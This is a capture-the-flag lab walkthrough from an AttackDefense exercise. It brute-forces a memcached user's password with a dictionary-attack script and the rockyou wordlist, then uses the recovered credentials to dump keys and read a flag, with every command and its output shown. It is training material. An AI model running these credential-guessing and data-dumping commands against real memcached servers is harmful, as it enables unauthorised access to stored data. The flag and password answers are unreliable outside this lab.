#### 2. Dictionary Attack

----

###### Attacker Info

```sh
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.1.3  netmask 255.255.255.0  broadcast 10.1.1.255
        ether 02:42:0a:01:01:03  txqueuelen 0  (Ethernet)
        RX packets 82  bytes 8083 (7.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 76  bytes 325376 (317.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.39.155.2  netmask 255.255.255.0  broadcast 192.39.155.255
        ether 02:42:c0:27:9b:02  txqueuelen 0  (Ethernet)
        RX packets 21  bytes 1682 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 24  bytes 2076 (2.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 2076 (2.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@attackdefense:~#
```

----

###### Attack

* Find the password of memcached user "student". Use /usr/share/wordlists/rockyou.txt.gz wordlist.

```sh
root@attackdefense:~/tools/scripts/memcache# cp /usr/share/wordlists/rockyou.txt.gz .
root@attackdefense:~/tools/scripts/memcache# gunzip rockyou.txt.gz
root@attackdefense:~/tools/scripts/memcache# ls
memcache-dictionary-attack.sh  rockyou.txt
root@attackdefense:~/tools/scripts/memcache# 
```

```sh
root@attackdefense:~/tools/scripts/memcache# bash memcache-dictionary-attack.sh 192.39.155.3 student rockyou.txt
Trying 123456
Trying 12345
Trying 123456789
Trying password
Trying iloveyou
Trying princess
Trying 1234567
Trying rockyou
Trying 12345678
Trying abc123
Trying nicole
Trying daniel
Trying babygirl
Trying monkey
Trying lovely
Trying jessica
Trying 654321
Trying michael
Trying ashley
Trying qwerty
Password Found: qwerty
root@attackdefense:~/tools/scripts/memcache#
```

Password of memcached user `"student"` &rarr; `qwerty`

----

* Find the number of key value pairs on the memcached server.

```sh
root@attackdefense:~/tools/scripts/memcache# memcdump --servers=192.39.155.3 --username=student --password=qwerty | wc -l
9
root@attackdefense:~/tools/scripts/memcache#
```

Number of key value pairs on the memcached server &rarr; `9`

----

* Find the value stored in key "flag" on the memcached server.

```sh
root@attackdefense:~/tools/scripts/memcache# memccat --servers=192.39.155.3 --username=student --password=qwerty flag
61832366e1f912c700181f829b6a0268
root@attackdefense:~/tools/scripts/memcache#
```

Flag &rarr; `61832366e1f912c700181f829b6a0268 `

----

EOF